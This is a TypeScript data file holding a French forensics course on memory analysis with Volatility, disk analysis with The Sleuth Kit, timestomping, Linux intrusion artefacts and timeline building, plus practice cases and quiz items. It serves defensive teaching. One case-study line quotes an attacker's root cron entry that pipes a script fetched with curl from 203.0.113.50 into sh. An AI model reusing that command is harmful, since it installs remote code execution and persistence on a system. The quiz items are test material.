import type { CourseBody } from '../../types';

export const body: CourseBody = {
  courseId: 'j-memoire-artefacts-linux',
  lesson: {
    intro:
      'Une fois les preuves préservées et acquises, il faut les faire parler. La mémoire vive montre ce qui tournait au moment de l’acquisition, y compris ce qui n’a jamais touché le disque ; le disque garde l’historique des fichiers, même supprimés ; les journaux et le réseau donnent le fil du temps. Ce cours présente les outils de référence de cette analyse (Volatility 3, The Sleuth Kit, Autopsy, FTK Imager) et les artefacts propres aux serveurs Linux, puis montre comment tout réunir dans une chronologie.',
    sections: [
      {
        id: 'memoire',
        title: 'Analyse mémoire avec Volatility 3',
        blocks: [
          { t: 'p', text: '**Volatility 3** reconstruit les structures du noyau à partir d’une image mémoire brute : processus, connexions, modules chargés, lignes de commande. Il s’appuie sur des **tables de symboles** propres à la version exacte du système analysé (fournies pour Windows, à générer pour un noyau Linux).' },
          { t: 'code', lang: 'bash', caption: 'Premiers plugins sur une image Windows', code: '# Processus tels que listés par le noyau (liste chaînée)\nvol -f poste12.raw windows.pslist\n\n# Recherche des structures de processus dans toute la mémoire\nvol -f poste12.raw windows.psscan\n\n# Arborescence, lignes de commande, connexions réseau\nvol -f poste12.raw windows.pstree\nvol -f poste12.raw windows.cmdline\nvol -f poste12.raw windows.netscan\n\n# Zones mémoire exécutables sans fichier associé (code injecté)\nvol -f poste12.raw windows.malfind' },
          {
            t: 'example',
            title: 'Un processus présent dans psscan mais absent de pslist',
            blocks: [
              { t: 'p', text: '`pslist` parcourt la liste chaînée des processus maintenue par le noyau ; `psscan` cherche les structures de processus dans toute la mémoire. Un processus visible par `psscan` et absent de `pslist` est soit **terminé** (sa structure subsiste en mémoire), soit **délié** de la liste par un rootkit pour se cacher. Les horodatages de fin et les connexions associées (`netscan`) permettent de trancher.' },
            ],
          },
          { t: 'def', term: 'Injection de code', text: 'Technique qui écrit du code dans l’espace mémoire d’un autre processus, souvent légitime, puis l’exécute. `malfind` signale les régions à la fois exécutables et non adossées à un fichier sur disque, souvent avec un en-tête d’exécutable visible.' },
          { t: 'callout', kind: 'warn', text: 'Les sorties de Volatility sont des **indices** à recouper : une région signalée par `malfind` peut être légitime (compilation à la volée de .NET ou de JavaScript). On extrait la zone, on calcule son empreinte et on l’analyse avant de conclure.' },
        ],
      },
      {
        id: 'disque',
        title: 'Image disque : The Sleuth Kit, Autopsy, FTK Imager',
        blocks: [
          { t: 'p', text: 'L’analyse se fait **toujours sur une copie** vérifiée par empreinte. **FTK Imager** sert à acquérir (formats brut ou E01), à vérifier les empreintes et à monter une image en lecture seule. **The Sleuth Kit** fournit des commandes qui lisent directement les structures du système de fichiers ; **Autopsy** en est l’interface graphique, avec recherche par mots-clés, galerie et chronologie.' },
          { t: 'code', lang: 'bash', caption: 'Parcours type avec The Sleuth Kit', code: '# 1. Table des partitions (repérer le décalage de départ, en secteurs)\nmmls serveur.dd\n\n# 2. Informations sur le système de fichiers de la partition qui commence au secteur 2048\nfsstat -o 2048 serveur.dd\n\n# 3. Liste récursive des fichiers ; les entrées supprimées sont marquées « * »\nfls -r -o 2048 serveur.dd\n\n# 4. Métadonnées puis contenu d’un fichier par son numéro d’inode\nistat -o 2048 serveur.dd 131090\nicat -o 2048 serveur.dd 131090 > extrait.bin' },
          { t: 'def', term: 'Inode', text: 'Structure qui décrit un fichier sur les systèmes de type Unix (ext4) : propriétaire, permissions, horodatages, emplacement des données. Le nom du fichier est stocké à part, dans le répertoire. Sur NTFS, le rôle équivalent est tenu par l’entrée de la **MFT**.' },
          { t: 'callout', kind: 'info', text: 'Un fichier supprimé n’est souvent que « délié » : son entrée est marquée libre, mais ses métadonnées et ses données restent sur le disque jusqu’à ce qu’elles soient réutilisées. `fls` et `icat` peuvent alors les récupérer.' },
        ],
      },
      {
        id: 'horodatages',
        title: 'Horodatages : NTFS, ext4 et falsification',
        blocks: [
          {
            t: 'table',
            head: ['Système', 'Horodatages', 'Particularité utile'],
            rows: [
              ['**NTFS**', 'Création, modification, accès, modification de l’entrée MFT — stockés **deux fois** : dans `$STANDARD_INFORMATION` et dans `$FILE_NAME`', '`$STANDARD_INFORMATION` se modifie avec une simple API ; `$FILE_NAME` est beaucoup plus difficile à changer'],
              ['**ext4**', '`atime` (accès), `mtime` (contenu), `ctime` (changement de métadonnées), `crtime` (création)', '`touch` peut modifier `atime` et `mtime`, mais met `ctime` à l’heure courante'],
            ],
          },
          { t: 'def', term: 'Falsification d’horodatage (timestomping)', text: 'Modification délibérée des dates d’un fichier pour le faire paraître ancien et le noyer parmi les fichiers système (MITRE ATT&CK T1070.006). Signes : sur NTFS, une date de création `$STANDARD_INFORMATION` antérieure à celle de `$FILE_NAME`, ou des fractions de seconde à zéro ; sur ext4, un `ctime` très postérieur au `mtime`.' },
          { t: 'callout', kind: 'warn', text: 'La date d’accès est peu fiable : sous Linux, l’option de montage `relatime` ne la met à jour que dans certains cas, et Windows peut ne pas la mettre à jour. On ne fonde jamais une conclusion sur un accès seul.' },
        ],
      },
      {
        id: 'linux',
        title: 'Artefacts d’une intrusion sur un serveur Linux',
        blocks: [
          {
            t: 'table',
            head: ['Question', 'Où regarder'],
            rows: [
              ['Qui s’est connecté, d’où ?', '`/var/log/auth.log` (Debian, Ubuntu) ou `/var/log/secure` (RHEL) ; `wtmp` (`last -f`), `btmp` (échecs, `lastb -f`) ; journal systemd'],
              ['Quelles commandes ?', '`~/.bash_history` de chaque compte (y compris root) ; journaux auditd s’ils existent'],
              ['Comment l’attaquant revient-il ?', 'Crontabs (`/etc/crontab`, `/etc/cron.d/`, `/var/spool/cron/`), unités systemd (`/etc/systemd/system/`, `~/.config/systemd/user/`), `~/.ssh/authorized_keys`, fichiers d’initialisation du shell, `/etc/ld.so.preload`'],
              ['Qu’a-t-il déposé ?', '`/tmp`, `/var/tmp`, `/dev/shm`, fichiers cachés (commençant par un point), binaires système modifiés (`debsums`, `rpm -Va`)'],
            ],
          },
          { t: 'code', lang: 'bash', caption: 'Lire les journaux d’une image montée en lecture seule', code: '# Journal systemd de l’image (et non celui de la station d’analyse)\njournalctl -D /mnt/image/var/log/journal --since "2026-10-02" -u ssh\n\n# Connexions enregistrées dans wtmp de l’image\nlast -f /mnt/image/var/log/wtmp' },
          { t: 'callout', kind: 'key', text: 'L’absence d’une trace est aussi une information : un `.bash_history` vide ou lié à `/dev/null`, un `wtmp` tronqué ou un trou dans le journal sont des indices d’effacement volontaire, à dater et à consigner.' },
        ],
      },
      {
        id: 'chronologie',
        title: 'Construire une chronologie multi-sources',
        blocks: [
          { t: 'p', text: 'La chronologie (timeline) est le livrable central d’une investigation : elle ordonne les événements de toutes les sources pour reconstituer ce qui s’est passé et dans quel ordre.' },
          { t: 'code', lang: 'bash', caption: 'Chronologie du système de fichiers avec The Sleuth Kit', code: '# Extraire les métadonnées de tous les fichiers au format « body »\nfls -r -m / -o 2048 serveur.dd > body.txt\n\n# Trier par date, au format CSV, sur la fenêtre de l’incident\nmactime -b body.txt -d 2026-10-01..2026-10-05 > chronologie.csv' },
          { t: 'list', items: ['**Normaliser les fuseaux horaires** : tout convertir en UTC et noter le fuseau de chaque source.', '**Vérifier la dérive des horloges** : un serveur non synchronisé décale toute sa chronologie.', 'Fusionner disque, journaux système, journaux applicatifs, pare-feu et réseau (Zeek, captures) ; les outils de « super-chronologie » comme plaso (log2timeline) automatisent cette fusion.', 'Partir d’un **point d’ancrage** fiable (alerte, connexion connue) et explorer avant et après.'] },
          { t: 'def', term: 'Point d’ancrage', text: 'Événement daté avec certitude, à partir duquel on oriente la recherche. Par exemple : la première connexion SSH réussie depuis l’adresse de l’attaquant, attestée à la fois par `auth.log` et par le pare-feu.' },
        ],
      },
    ],
    useCases: [
      'Investigation d’un serveur web Linux compromis : point d’entrée, commandes exécutées, persistance, données touchées.',
      'Recherche d’un malware sans fichier sur un poste Windows à partir d’une image mémoire.',
      'Expertise judiciaire : chronologie documentée et reproductible, chaque conclusion reliée à un artefact et à son empreinte.',
    ],
    commonMistakes: [
      'Monter une image en lecture-écriture ou analyser l’original au lieu de la copie.',
      'Lire les journaux de la station d’analyse au lieu de ceux de l’image (oublier `-D` ou `-f`).',
      'Mélanger heures locales et UTC dans la chronologie.',
      'Conclure à une compromission sur une seule sortie de `malfind`, sans recoupement.',
      'Se fier à la date d’accès d’un fichier ou à des horodatages `$STANDARD_INFORMATION` sans les comparer à `$FILE_NAME`.',
    ],
    bestPractices: [
      'Travailler sur une copie vérifiée par empreinte, montée en lecture seule.',
      'Consigner chaque commande, version d’outil et résultat (reproductibilité).',
      'Recouper chaque conclusion par au moins deux sources indépendantes.',
      'Convertir toutes les sources en UTC et mesurer la dérive des horloges.',
      'Rechercher systématiquement les mécanismes de persistance avant de déclarer un système nettoyé.',
    ],
    keyPoints: [
      '`pslist` suit la liste du noyau, `psscan` cherche dans toute la mémoire : un écart signale un processus terminé ou caché.',
      'The Sleuth Kit : `mmls`, `fls`, `istat`, `icat`, `mactime` ; Autopsy en est l’interface graphique.',
      'NTFS stocke les dates deux fois ; un écart entre `$SI` et `$FN` trahit la falsification.',
      'Linux : auth.log ou secure, wtmp, bash_history, cron, systemd, authorized_keys.',
      'Une chronologie fiable est en UTC, multi-sources et ancrée sur un événement certain.',
    ],
  },
  practice: [
    {
      id: 'memoire-poste',
      kind: 'analysis',
      title: 'Interpréter des sorties Volatility',
      context: [
        { t: 'p', text: 'Extraits d’une image mémoire d’un poste Windows :' },
        { t: 'code', lang: 'text', code: 'windows.pslist (extrait)\nPID   PPID  Nom              Création\n4120  3988  explorer.exe     2026-10-02 07:58:12\n6604  4120  OUTLOOK.EXE      2026-10-02 08:01:40\n\nwindows.psscan (extrait, en plus de ce qui précède)\n7216  6604  rundll32.exe     2026-10-02 09:12:03   (absent de pslist, pas d’heure de fin)\n\nwindows.netscan\n7216  rundll32.exe  10.1.4.31:50412 → 198.51.100.23:443  ESTABLISHED\n\nwindows.malfind\n7216  rundll32.exe  région 0x2a10000  PAGE_EXECUTE_READWRITE  en-tête « MZ »' },
      ],
      steps: ['Interpréter chaque observation.', 'Formuler une conclusion prudente et ce qui la renforcerait.', 'Indiquer les extractions à réaliser pour la suite de l’analyse.'],
    },
    {
      id: 'serveur-linux',
      kind: 'case',
      title: 'Cas pratique : chronologie d’un serveur Linux compromis',
      context: [
        { t: 'p', text: 'Image disque d’un serveur Ubuntu. Observations brutes :' },
        { t: 'code', lang: 'text', code: 'auth.log  : 2026-10-02 22:41:07 Accepted password for deploy from 203.0.113.50\nauth.log  : 2026-10-02 22:40:55 … 22:41:05  1 312 « Failed password for deploy » depuis 203.0.113.50\nwtmp      : aucune entrée entre 22:00 et 23:30\n/home/deploy/.bash_history : lien symbolique vers /dev/null, ctime 2026-10-02 22:43:10\n/etc/cron.d/sysupdate : créé (crtime) 2026-10-02 22:44:31, contenu : « */5 * * * * root curl -s http://203.0.113.50/u.sh | sh »\n/usr/lib/x86_64-linux-gnu/libkeyutils.so.9 : mtime 2021-03-14, ctime 2026-10-02 22:45:02' },
      ],
      steps: ['Construire la chronologie des faits en UTC (le serveur est en UTC).', 'Identifier le point d’entrée, la persistance et les tentatives de dissimulation.', 'Lister les vérifications et les mesures de remédiation.'],
    },
  ],
  questions: [
    { id: 'jfm-q1', type: 'single', difficulty: 2, skills: ['j-mem-volatility'], prompt: 'Un processus apparaît dans `windows.psscan` mais pas dans `windows.pslist`. Quelle interprétation est juste ?', options: [{ id: 'a', text: 'Le processus est terminé (sa structure subsiste en mémoire) ou il a été délié de la liste du noyau pour se cacher' }, { id: 'b', text: 'L’image mémoire est forcément corrompue' }, { id: 'c', text: '`psscan` invente des processus fictifs' }, { id: 'd', text: 'Le processus tourne sur une autre machine' }] },
    { id: 'jfm-q2', type: 'short', difficulty: 2, skills: ['j-mem-volatility'], prompt: 'Quel plugin Volatility 3 pour Windows signale les régions mémoire exécutables non adossées à un fichier, typiques d’une injection de code ? (donnez le nom complet du plugin)', placeholder: 'windows.…' },
    { id: 'jfm-q3', type: 'truefalse', difficulty: 2, skills: ['j-mem-volatility'], prompt: 'Toute région signalée par `malfind` prouve à elle seule la présence d’un malware.' },
    { id: 'jfm-q4', type: 'multi', difficulty: 2, skills: ['j-mem-volatility', 'j-chronologie'], prompt: 'Quelles informations l’analyse mémoire peut-elle apporter, alors que le disque ne les contient pas toujours ?', options: [{ id: 'a', text: 'Les connexions réseau ouvertes au moment de l’acquisition' }, { id: 'b', text: 'Le code d’un malware exécuté uniquement en mémoire' }, { id: 'c', text: 'Les lignes de commande des processus en cours' }, { id: 'd', text: 'L’historique complet des fichiers supprimés depuis l’installation' }] },
    { id: 'jfm-q5', type: 'single', difficulty: 2, skills: ['j-fs-tsk'], prompt: 'Quelle commande de The Sleuth Kit affiche la table des partitions d’une image et leur décalage de départ ?', options: [{ id: 'a', text: '`mmls`' }, { id: 'b', text: '`icat`' }, { id: 'c', text: '`mactime`' }, { id: 'd', text: '`istat`' }] },
    { id: 'jfm-q6', type: 'short', difficulty: 2, skills: ['j-fs-tsk'], prompt: 'Quelle commande de The Sleuth Kit extrait le contenu d’un fichier à partir de son numéro d’inode ?' },
    { id: 'jfm-q7', type: 'truefalse', difficulty: 1, skills: ['j-fs-tsk'], prompt: 'Un fichier supprimé peut souvent être récupéré tant que ses blocs de données n’ont pas été réutilisés.' },
    { id: 'jfm-q8', type: 'multi', difficulty: 3, skills: ['j-fs-tsk', 'j-chronologie'], prompt: 'Sur NTFS, quels constats évoquent une falsification d’horodatage ?', options: [{ id: 'a', text: 'Date de création `$STANDARD_INFORMATION` antérieure à celle de `$FILE_NAME`' }, { id: 'b', text: 'Horodatages `$STANDARD_INFORMATION` dont les fractions de seconde valent exactement zéro' }, { id: 'c', text: 'Date de modification postérieure à la date de création' }, { id: 'd', text: 'Exécutable daté de 2019 dans un dossier créé hier, avec un `$FILE_NAME` daté d’hier' }] },
    { id: 'jfm-q9', type: 'single', difficulty: 2, skills: ['j-artefacts-linux'], prompt: 'Sur un serveur RHEL, dans quel fichier trouve-t-on habituellement les authentifications SSH ?', options: [{ id: 'a', text: '`/var/log/secure`' }, { id: 'b', text: '`/var/log/auth.log`' }, { id: 'c', text: '`/etc/ssh/sshd_config`' }, { id: 'd', text: '`/var/log/dpkg.log`' }] },
    { id: 'jfm-q10', type: 'multi', difficulty: 2, skills: ['j-artefacts-linux'], prompt: 'Quels emplacements sont des mécanismes de persistance à vérifier sur un serveur Linux compromis ?', options: [{ id: 'a', text: '`/etc/cron.d/` et `/var/spool/cron/`' }, { id: 'b', text: '`/etc/systemd/system/`' }, { id: 'c', text: '`~/.ssh/authorized_keys`' }, { id: 'd', text: '`/usr/share/doc/`' }] },
    { id: 'jfm-q11', type: 'truefalse', difficulty: 2, skills: ['j-artefacts-linux'], prompt: 'Un fichier `.bash_history` lié symboliquement à `/dev/null` est un indice possible de dissimulation volontaire.' },
    { id: 'jfm-q12', type: 'open', difficulty: 3, skills: ['j-artefacts-linux', 'j-chronologie'], prompt: 'Vous analysez l’image d’un serveur Linux compromis. Décrivez dans quel ordre vous rechercheriez le point d’entrée, les actions de l’attaquant et sa persistance, et quels artefacts vous consulteriez pour chacun.' },
    { id: 'jfm-q13', type: 'single', difficulty: 2, skills: ['j-chronologie'], prompt: 'Pourquoi faut-il convertir toutes les sources en UTC avant de construire une chronologie ?', options: [{ id: 'a', text: 'Pour éviter que des sources en heures locales différentes inversent l’ordre réel des événements' }, { id: 'b', text: 'Parce que les outils refusent les heures locales' }, { id: 'c', text: 'Pour réduire la taille du fichier' }, { id: 'd', text: 'Parce que l’UTC chiffre les horodatages' }] },
    { id: 'jfm-q14', type: 'short', difficulty: 2, skills: ['j-chronologie'], prompt: 'Quelle commande de The Sleuth Kit transforme un fichier « body » produit par `fls -m` en chronologie triée ?' },
    { id: 'jfm-q15', type: 'open', difficulty: 3, skills: ['j-chronologie', 'j-fs-tsk'], prompt: 'Sur un serveur ext4, un binaire système affiche un `mtime` de 2021 et un `ctime` de la nuit de l’incident. Que peut-on en conclure et comment le vérifier ?' },
    { id: 'jfm-q16', type: 'single', difficulty: 1, skills: ['j-mem-volatility', 'j-fs-tsk'], prompt: 'Sur quoi l’analyse doit-elle toujours porter ?', options: [{ id: 'a', text: 'Sur une copie dont l’empreinte a été vérifiée, montée en lecture seule' }, { id: 'b', text: 'Directement sur le disque original, pour gagner du temps' }, { id: 'c', text: 'Sur le système en cours d’exécution, après redémarrage' }, { id: 'd', text: 'Sur une copie modifiée pour retirer les fichiers inutiles' }] },
  ],
  resources: [
    { title: 'Volatility 3 documentation', source: 'Volatility Foundation', url: 'https://volatility3.readthedocs.io/' },
    { title: 'The Sleuth Kit', source: 'Brian Carrier / Basis Technology', url: 'https://www.sleuthkit.org/sleuthkit/' },
    { title: 'Autopsy', source: 'Basis Technology', url: 'https://www.autopsy.com/' },
    { title: 'Guide to Integrating Forensic Techniques into Incident Response (SP 800-86)', source: 'NIST', url: 'https://csrc.nist.gov/pubs/sp/800/86/final' },
    { title: 'plaso (log2timeline)', source: 'Projet plaso', url: 'https://plaso.readthedocs.io/' },
  ],
};
